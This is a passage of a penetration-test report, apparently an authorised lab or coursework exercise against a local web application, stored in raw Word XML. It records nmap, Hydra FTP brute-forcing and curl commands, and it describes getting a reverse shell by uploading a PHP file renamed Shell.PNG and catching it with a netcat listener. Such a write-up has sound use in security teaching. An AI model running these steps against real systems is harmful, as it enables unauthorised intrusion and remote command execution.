        <w:t>a change in the quantity displayed on the web application.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BC9B12E" w14:textId="77777777" w:rsidR="0048297F" w:rsidRDefault="0048297F" w:rsidP="0048297F">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="11389B0E" wp14:editId="43A12BBF">
            <wp:extent cx="3400425" cy="18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180975"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="139F0017" w14:textId="77777777" w:rsidR="008A4696" w:rsidRDefault="00637C79" w:rsidP="0048297F">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t>In addition, due to the fact that no money is processed on the web application, it is not possible to modify or otherwise alter the amount being charged to the user.</w:t>
      </w:r>
      <w:r w:rsidR="003A6CCD">
        <w:t xml:space="preserve"> When this was attempted it was done by changing the ID that was being transmitted to the </w:t>
      </w:r>
      <w:r w:rsidR="008951D9">
        <w:t xml:space="preserve">order page. However, this changes the pizza that was ordered, not the price of the same pizza. Since that was the only variable transmitted </w:t>
      </w:r>
      <w:r w:rsidR="004D38B2">
        <w:t>on</w:t>
      </w:r>
      <w:r w:rsidR="008951D9">
        <w:t xml:space="preserve"> that </w:t>
      </w:r>
      <w:r w:rsidR="004D38B2">
        <w:t>page there is no other way of directly tampering with these variables.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55D325AE" w14:textId="77777777" w:rsidR="002A1D22" w:rsidRDefault="002A1D22" w:rsidP="0048297F">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="20596E50" w14:textId="77777777" w:rsidR="00257FFB" w:rsidRDefault="00257FFB" w:rsidP="002027D4">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="12" w:space="0" w:color="auto"/>
        </w:pBdr>
      </w:pPr>
      <w:bookmarkStart w:id="50" w:name="_Toc58836602"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Procedure: Test the web Server</w:t>
      </w:r>
      <w:bookmarkEnd w:id="50"/>
    </w:p>
    <w:p w14:paraId="21E9AE55" w14:textId="77777777" w:rsidR="00A55FE8" w:rsidRDefault="00A55FE8" w:rsidP="00A55FE8">
      <w:r>
        <w:t xml:space="preserve">The web server, if compromised, should provide the greatest quantity of restricted data. While other sections may be able to exfiltrate bits of information on the web application, </w:t>
      </w:r>
      <w:r w:rsidR="00BD6A81">
        <w:t>the</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> web server could be used</w:t>
      </w:r>
      <w:r w:rsidR="00BD6A81">
        <w:t xml:space="preserve"> to potentially dump all the data held in the database. In order to achieve this more information will first need to be gathered about the web server, including services it is running. If particularly vulnerable services are running, this section will be quite straight forward. Otherwise more will have to be done to compromise these services.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CD1C05B" w14:textId="77777777" w:rsidR="002A1D22" w:rsidRPr="00A55FE8" w:rsidRDefault="002A1D22" w:rsidP="00A55FE8"/>
    <w:p w14:paraId="35CD35DB" w14:textId="77777777" w:rsidR="00257FFB" w:rsidRDefault="00391A4F" w:rsidP="00391A4F">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="51" w:name="_Toc58836603"/>
      <w:r>
        <w:t>Test For Default Credentials</w:t>
      </w:r>
      <w:bookmarkEnd w:id="51"/>
    </w:p>
    <w:p w14:paraId="1C97E163" w14:textId="77777777" w:rsidR="00391A4F" w:rsidRDefault="00391A4F" w:rsidP="00391A4F">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The first step was to determine which ports where open on the server. </w:t>
      </w:r>
      <w:r w:rsidR="000876D2">
        <w:t>A full list of open TCP ports (</w:t>
      </w:r>
      <w:r w:rsidR="000876D2" w:rsidRPr="007577DE">
        <w:t>Appendix</w:t>
      </w:r>
      <w:r w:rsidR="007577DE">
        <w:t xml:space="preserve"> 9.1</w:t>
      </w:r>
      <w:r w:rsidR="000876D2">
        <w:t>) was generated</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> by carrying out an Nmap test with the command:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09AE49BE" w14:textId="77777777" w:rsidR="000876D2" w:rsidRDefault="00391A4F" w:rsidP="000876D2">
      <w:pPr>
        <w:ind w:left="708"/>
        <w:rPr>
          <w:bdr w:val="single" w:sz="4" w:space="0" w:color="auto"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:bdr w:val="single" w:sz="4" w:space="0" w:color="auto"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r w:rsidRPr="00FD7693">
        <w:rPr>
          <w:bdr w:val="single" w:sz="4" w:space="0" w:color="auto"/>
        </w:rPr>
        <w:t>map -sT -sV -vv 192.168.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:bdr w:val="single" w:sz="4" w:space="0" w:color="auto"/>
        </w:rPr>
        <w:t xml:space="preserve">1.20  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E4FA907" w14:textId="77777777" w:rsidR="004F6482" w:rsidRDefault="004F6482" w:rsidP="004F6482">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t>This shows that port 21 is open and by browsing to ftp://192.168.1.20 a</w:t>
      </w:r>
      <w:r w:rsidR="00690DD1">
        <w:t>nd therefore a</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> default login </w:t>
      </w:r>
      <w:r w:rsidR="00690DD1">
        <w:t>was</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> attempted.</w:t>
      </w:r>
      <w:r w:rsidR="00690DD1">
        <w:t xml:space="preserve"> However, none of the default credentials succeeded in gaining </w:t>
      </w:r>
      <w:r w:rsidR="004476C3">
        <w:t>access when using admin</w:t>
      </w:r>
      <w:r w:rsidR="004C5A8F">
        <w:t xml:space="preserve"> or user</w:t>
      </w:r>
      <w:r w:rsidR="004476C3">
        <w:t xml:space="preserve"> as the username and running </w:t>
      </w:r>
      <w:r w:rsidR="004C5A8F">
        <w:t xml:space="preserve">Hydra with </w:t>
      </w:r>
      <w:r w:rsidR="004476C3">
        <w:t>the password.ls</w:t>
      </w:r>
      <w:r w:rsidR="004C5A8F">
        <w:t>t wordlist</w:t>
      </w:r>
      <w:r w:rsidR="004476C3">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51147BC9" w14:textId="77777777" w:rsidR="004476C3" w:rsidRDefault="004476C3" w:rsidP="001677F2">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r w:rsidRPr="004476C3">
        <w:t>hydra -l admin -p user/share/wordlists/metasploit/password.lst ftp://192.168.1.20</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19DDACCE" w14:textId="77777777" w:rsidR="004C5A8F" w:rsidRDefault="004C5A8F" w:rsidP="001677F2">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="683B2C0E" w14:textId="77777777" w:rsidR="00391A4F" w:rsidRDefault="00391A4F" w:rsidP="00391A4F">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="52" w:name="_Toc58836604"/>
      <w:r>
        <w:t>Test for Dangerous HTTP Methods</w:t>
      </w:r>
      <w:bookmarkEnd w:id="52"/>
    </w:p>
    <w:p w14:paraId="41161164" w14:textId="77777777" w:rsidR="001677F2" w:rsidRDefault="001677F2" w:rsidP="001677F2">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t>In order to test for dangerous HTTP methods on the 192.168.1.20 server curl was used to determine what methods were enabled. The curl command that was crafted is listed below:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06A61049" w14:textId="77777777" w:rsidR="001677F2" w:rsidRDefault="001677F2" w:rsidP="001677F2">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r w:rsidRPr="001677F2">
        <w:t>curl -i -X OPTIONS http://192.168.1.20</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BCB63AA" w14:textId="77777777" w:rsidR="001677F2" w:rsidRPr="001677F2" w:rsidRDefault="001677F2" w:rsidP="001677F2">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t>However, the response lacked any of the method information making it impossible to make a determination on what methods are in use at this stage.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34BB2B81" w14:textId="77777777" w:rsidR="0067341D" w:rsidRDefault="0067341D">
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B80B6ED" w14:textId="77777777" w:rsidR="00391A4F" w:rsidRDefault="00391A4F" w:rsidP="00DA3A43">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="53" w:name="_Toc58836605"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Test for Web Server Software Bugs</w:t>
      </w:r>
      <w:bookmarkEnd w:id="53"/>
    </w:p>
    <w:p w14:paraId="63F66B60" w14:textId="77777777" w:rsidR="00DA3A43" w:rsidRDefault="00DA3A43" w:rsidP="007D1515">
      <w:pPr>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>When looking at section 9.1 (</w:t>
      </w:r>
      <w:r w:rsidRPr="00F05E7D">
        <w:t>Appendix</w:t>
      </w:r>
      <w:r w:rsidR="007577DE">
        <w:t xml:space="preserve"> 9.1</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">) an analysis was done of the services running on the server to determine </w:t>
      </w:r>
      <w:r w:rsidR="00277872">
        <w:t>any vulnerabilities that can be identified</w:t>
      </w:r>
      <w:r w:rsidR="007D1515">
        <w:t>. This was carried out on the 4 services found to be running including:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F823470" w14:textId="77777777" w:rsidR="007D1515" w:rsidRPr="00DA3A43" w:rsidRDefault="007D1515" w:rsidP="007D1515">
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r w:rsidRPr="007D1515">
        <w:t>ProFTPD 1.3.4c</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4122A27A" w14:textId="77777777" w:rsidR="001677F2" w:rsidRDefault="007D1515" w:rsidP="007D1515">
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r w:rsidRPr="007D1515">
        <w:t>Apache httpd 2.4.29</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68BFEA79" w14:textId="77777777" w:rsidR="007D1515" w:rsidRDefault="007D1515" w:rsidP="007D1515">
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r w:rsidRPr="007D1515">
        <w:t>PHP 5.6.34</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25932117" w14:textId="77777777" w:rsidR="007D1515" w:rsidRDefault="007D1515" w:rsidP="007D1515">
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r w:rsidRPr="007D1515">
        <w:t>Perl 2.0.8</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18692FDF" w14:textId="77777777" w:rsidR="007D1515" w:rsidRDefault="007D1515" w:rsidP="007D1515">
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>MariaDB</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="165E408D" w14:textId="77777777" w:rsidR="007D1515" w:rsidRDefault="007D1515" w:rsidP="007D1515">
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
        <w:ind w:left="720"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="38DF2017" w14:textId="77777777" w:rsidR="007D1515" w:rsidRDefault="007D1515" w:rsidP="00C72993">
      <w:pPr>
        <w:ind w:left="705"/>
      </w:pPr>
      <w:r>
        <w:t>When</w:t>
      </w:r>
      <w:r w:rsidR="00C72993">
        <w:t xml:space="preserve"> preforming this section there was a wide verity in the quantity of vulnerabilities therefore only those with a CVE score of more than 8 or the highest will be included. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62DED50A" w14:textId="77777777" w:rsidR="00B00129" w:rsidRDefault="00B00129" w:rsidP="00B00129">
      <w:pPr>
        <w:ind w:left="705"/>
      </w:pPr>
      <w:r>
        <w:t>For the MariaDB service, since no version was given, an attempt was made to connect to it with the command below in order to gain further information.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="199FD3CD" w14:textId="77777777" w:rsidR="00B00129" w:rsidRPr="00B00129" w:rsidRDefault="00B00129" w:rsidP="00B00129">
      <w:pPr>
        <w:ind w:left="705"/>
        <w:rPr>
          <w:bdr w:val="single" w:sz="4" w:space="0" w:color="auto"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:bdr w:val="single" w:sz="4" w:space="0" w:color="auto"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="002D13EF">
        <w:rPr>
          <w:bdr w:val="single" w:sz="4" w:space="0" w:color="auto"/>
        </w:rPr>
        <w:t>mysql 192.168.1.20</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="238D19EB" w14:textId="77777777" w:rsidR="00B00129" w:rsidRDefault="00B00129" w:rsidP="00B00129">
      <w:pPr>
        <w:ind w:firstLine="705"/>
      </w:pPr>
      <w:r>
        <w:t>However, this was unsuccessful as the server responded with an error message. (</w:t>
      </w:r>
      <w:r w:rsidRPr="00F05E7D">
        <w:t>Appendix</w:t>
      </w:r>
      <w:r w:rsidR="00F05E7D">
        <w:t xml:space="preserve"> 9.2</w:t>
      </w:r>
      <w:r>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblInd w:w="817" w:type="dxa"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8533"/>
      </w:tblGrid>
      <w:tr w:rsidR="00C24E1F" w14:paraId="58774C7F" w14:textId="77777777" w:rsidTr="00C24E1F">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="8759" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="772819EB" w14:textId="77777777" w:rsidR="00C24E1F" w:rsidRDefault="00C24E1F" w:rsidP="00C24E1F">
            <w:pPr>
              <w:pStyle w:val="NoSpacing"/>
            </w:pPr>
            <w:r w:rsidRPr="007D1515">
              <w:t>ProFTPD 1.3.4c</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00C24E1F" w14:paraId="71748924" w14:textId="77777777" w:rsidTr="00C24E1F">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="8759" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="73BE955A" w14:textId="77777777" w:rsidR="00C24E1F" w:rsidRDefault="00C24E1F" w:rsidP="00C72993">
            <w:r>
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:drawing>
                <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1918190D" wp14:editId="4C85D952">
                  <wp:extent cx="5495925" cy="3352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4284" cy="347376"/>
                          </a:xfrm>
                          <a:prstGeom prst="rect">
                            <a:avLst/>
                          </a:prstGeom>
                        </pic:spPr>
                      </pic:pic>
                    </a:graphicData>
                  </a:graphic>
                </wp:inline>
              </w:drawing>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00C24E1F" w14:paraId="605EEC94" w14:textId="77777777" w:rsidTr="00C24E1F">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="8759" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1EBE1634" w14:textId="77777777" w:rsidR="00B36CFD" w:rsidRDefault="00B36CFD" w:rsidP="00C24E1F">
            <w:pPr>
              <w:pStyle w:val="NoSpacing"/>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="7D66808F" w14:textId="77777777" w:rsidR="00C24E1F" w:rsidRDefault="00C24E1F" w:rsidP="00C24E1F">
            <w:pPr>
              <w:pStyle w:val="NoSpacing"/>
            </w:pPr>
            <w:r w:rsidRPr="007D1515">
              <w:t>Apache httpd 2.4.29</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00C24E1F" w14:paraId="7C886487" w14:textId="77777777" w:rsidTr="00C24E1F">
        <w:trPr>
          <w:trHeight w:val="625"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="8759" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="34A6C2B5" w14:textId="77777777" w:rsidR="00C24E1F" w:rsidRDefault="00C24E1F" w:rsidP="00C72993">
            <w:r>
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:drawing>
                <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="45EEF136" wp14:editId="7AA876F6">
                  <wp:extent cx="5539666" cy="304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6174" cy="314512"/>
                          </a:xfrm>
                          <a:prstGeom prst="rect">
                            <a:avLst/>
                          </a:prstGeom>
                        </pic:spPr>
                      </pic:pic>
                    </a:graphicData>
                  </a:graphic>
                </wp:inline>
              </w:drawing>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00C24E1F" w14:paraId="2E8624AF" w14:textId="77777777" w:rsidTr="00C24E1F">
        <w:trPr>
          <w:trHeight w:val="279"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="8759" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="178599E3" w14:textId="77777777" w:rsidR="00B36CFD" w:rsidRDefault="00B36CFD" w:rsidP="00C24E1F">
            <w:pPr>
              <w:pStyle w:val="NoSpacing"/>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="7B6D6344" w14:textId="77777777" w:rsidR="00C24E1F" w:rsidRDefault="00C24E1F" w:rsidP="00C24E1F">
            <w:pPr>
              <w:pStyle w:val="NoSpacing"/>
            </w:pPr>
            <w:r w:rsidRPr="007D1515">
              <w:t>PHP 5.6.3</w:t>
            </w:r>
            <w:r>
              <w:t>4</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00C24E1F" w14:paraId="30E460BC" w14:textId="77777777" w:rsidTr="00B36CFD">
        <w:trPr>
          <w:trHeight w:val="652"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="8759" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6B3A2683" w14:textId="77777777" w:rsidR="00C24E1F" w:rsidRPr="007D1515" w:rsidRDefault="00C24E1F" w:rsidP="00C24E1F">
            <w:pPr>
              <w:pStyle w:val="NoSpacing"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:drawing>
                <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2BE8AD1C" wp14:editId="1845DAD3">
                  <wp:extent cx="5553856" cy="3619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20" cy="363759"/>
                          </a:xfrm>
                          <a:prstGeom prst="rect">
                            <a:avLst/>
                          </a:prstGeom>
                        </pic:spPr>
                      </pic:pic>
                    </a:graphicData>
                  </a:graphic>
                </wp:inline>
              </w:drawing>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00C24E1F" w14:paraId="2FECDD97" w14:textId="77777777" w:rsidTr="00C24E1F">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="8759" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="445FCA90" w14:textId="77777777" w:rsidR="00B36CFD" w:rsidRDefault="00B36CFD" w:rsidP="00C24E1F">
            <w:pPr>
              <w:pStyle w:val="NoSpacing"/>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="29EACDFB" w14:textId="77777777" w:rsidR="00C24E1F" w:rsidRDefault="00C24E1F" w:rsidP="00C24E1F">
            <w:pPr>
              <w:pStyle w:val="NoSpacing"/>
            </w:pPr>
            <w:r w:rsidRPr="007D1515">
              <w:t>Perl 2.0.8</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00C24E1F" w14:paraId="1EE1AE7C" w14:textId="77777777" w:rsidTr="00C24E1F">
        <w:trPr>
          <w:trHeight w:val="692"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="8759" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2CFDC7AB" w14:textId="77777777" w:rsidR="00C24E1F" w:rsidRDefault="00C24E1F" w:rsidP="00C72993">
            <w:r>
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:drawing>
                <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4AE8875A" wp14:editId="559D5219">
                  <wp:extent cx="5534025" cy="4085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389" cy="415588"/>
                          </a:xfrm>
                          <a:prstGeom prst="rect">
                            <a:avLst/>
                          </a:prstGeom>
                        </pic:spPr>
                      </pic:pic>
                    </a:graphicData>
                  </a:graphic>
                </wp:inline>
              </w:drawing>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="52EF89D6" w14:textId="77777777" w:rsidR="00C24E1F" w:rsidRDefault="00C24E1F" w:rsidP="00C72993">
      <w:pPr>
        <w:ind w:left="705"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4A87B8D3" w14:textId="77777777" w:rsidR="00B00129" w:rsidRDefault="00B00129" w:rsidP="00B00129">
      <w:pPr>
        <w:ind w:firstLine="705"/>
      </w:pPr>
      <w:r>
        <w:t>For the Perl vulnerability, this cannot be ex</w:t>
      </w:r>
      <w:r w:rsidR="00AF2A17">
        <w:t>ploited as there is no Perl file on the server.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53CA4793" w14:textId="77777777" w:rsidR="0067341D" w:rsidRDefault="0067341D">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="majorEastAsia" w:cstheme="majorBidi"/>
          <w:b/>
          <w:bCs/>
          <w:caps/>
          <w:color w:val="274221" w:themeColor="accent4" w:themeShade="80"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="54" w:name="_Toc58836606"/>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="1228B2D7" w14:textId="77777777" w:rsidR="0092041E" w:rsidRDefault="0092041E" w:rsidP="0092041E">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="12" w:space="0" w:color="auto"/>
        </w:pBdr>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Procedure: Miscellaneous</w:t>
      </w:r>
      <w:bookmarkEnd w:id="54"/>
    </w:p>
    <w:p w14:paraId="3F63F5EF" w14:textId="77777777" w:rsidR="00EA6881" w:rsidRDefault="000553DE" w:rsidP="00AF2A17">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">It was possible to submit the PHP file shown in </w:t>
      </w:r>
      <w:r w:rsidR="004D38B2" w:rsidRPr="004D38B2">
        <w:t>A</w:t>
      </w:r>
      <w:r w:rsidRPr="004D38B2">
        <w:t>ppendix</w:t>
      </w:r>
      <w:r w:rsidR="004D38B2">
        <w:t xml:space="preserve"> 10.1</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to the </w:t>
      </w:r>
      <w:r w:rsidR="009468C8">
        <w:t xml:space="preserve">upload photo section of the member-profile page. This was </w:t>
      </w:r>
      <w:r w:rsidR="00994D4E">
        <w:t>achieved by</w:t>
      </w:r>
      <w:r w:rsidR="009468C8">
        <w:t xml:space="preserve"> changing the file name to Shell.PNG</w:t>
      </w:r>
      <w:r w:rsidR="00994D4E">
        <w:t xml:space="preserve"> in order to trick the server into accepting it. </w:t>
      </w:r>
      <w:r w:rsidR="00AF2A17">
        <w:t>At this point a listener was setup to connect</w:t>
      </w:r>
      <w:r w:rsidR="00EA6881">
        <w:t xml:space="preserve"> to the shell using the command: sudo nc -nvlp 1234</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78DE9AA7" w14:textId="7D1FF9FF" w:rsidR="009525A9" w:rsidRDefault="00994D4E" w:rsidP="00AF2A17">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t>Then,</w:t>
      </w:r>
      <w:r w:rsidR="00EA6881">
        <w:t xml:space="preserve"> the </w:t>
      </w:r>
      <w:r w:rsidR="00A32685">
        <w:t xml:space="preserve">location the </w:t>
      </w:r>
      <w:r w:rsidR="00EA6881">
        <w:t>page has been stored on was</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00AF2A17">
        <w:t>traverse</w:t>
      </w:r>
      <w:r w:rsidR="00EA6881">
        <w:t>d</w:t>
      </w:r>
      <w:r w:rsidR="00AF2A17">
        <w:t xml:space="preserve"> to in order to trigger the PHP code. In this case that is 192.168.1.20/pictures/Shell.PNG. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EDFE7CA" w14:textId="77777777" w:rsidR="00EA6881" w:rsidRDefault="00EA6881" w:rsidP="00AF2A17">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This then resulted in the </w:t>
      </w:r>
      <w:r w:rsidR="00A35027">
        <w:t>listener</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> connecting to the server and gaining command line access as shown below.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3ECBF23F" w14:textId="2885DC6E" w:rsidR="001B1F07" w:rsidRDefault="001B1F07" w:rsidP="00EA6881">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0F637116" wp14:editId="74F610F6">
            <wp:extent cx="5048834"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7086" cy="1174299"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="326621CF" w14:textId="132BBE5F" w:rsidR="007A77C5" w:rsidRDefault="007A77C5" w:rsidP="00EA6881">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1032F085" w14:textId="16F9F4E4" w:rsidR="007A77C5" w:rsidRDefault="007A77C5" w:rsidP="007A77C5">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Discussion</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E347C8A" w14:textId="0E9A65F8" w:rsidR="007A77C5" w:rsidRDefault="007A77C5" w:rsidP="007A77C5">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="54469889" w14:textId="4B654801" w:rsidR="007A77C5" w:rsidRDefault="007A77C5" w:rsidP="007A77C5">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>Source Code analysis</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="078828E1" w14:textId="3DC3A7FF" w:rsidR="00790807" w:rsidRPr="00292DEC" w:rsidRDefault="00790807" w:rsidP="00790807">
      <w:pPr>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>After an analysis of the contents of a selection of files containing the source code of the web application, it became apparent that there was a naming scheme where data handling took place in files ending in “</w:t>
      </w:r>
      <w:r w:rsidR="00582609" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>exec”. This allowed for a more focused search where all of the files with this suffix were searched first.</w:t>
      </w:r>
    </w:p>
